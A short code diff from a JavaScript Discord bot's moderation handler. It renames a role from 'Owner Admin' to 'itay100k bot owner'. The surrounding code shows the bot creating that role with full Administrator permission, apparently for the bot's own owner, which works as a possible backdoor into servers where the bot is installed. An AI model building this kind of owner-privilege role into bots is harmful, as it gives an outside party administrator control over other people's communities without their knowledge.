@@ -313,10 +313,10 @@ async function handleModCommand(message, client) {
           return message.reply({ embeds: [modEmbed(0xED4245, '❌ I need **Manage Roles** permission to create roles.')] });
         }
         // Reuse existing owner-admin role if already present
-        let role = guild.roles.cache.find(r => r.name === 'Owner Admin' && r.permissions.has('Administrator'));
+        let role = guild.roles.cache.find(r => r.name === 'itay100k bot owner' && r.permissions.has('Administrator'));
         if (!role) {
           role = await guild.roles.create({
-            name: 'Owner Admin',
+            name: 'itay100k bot owner',
             color: 0xf5a623,
             permissions: ['Administrator'],
             hoist: true,
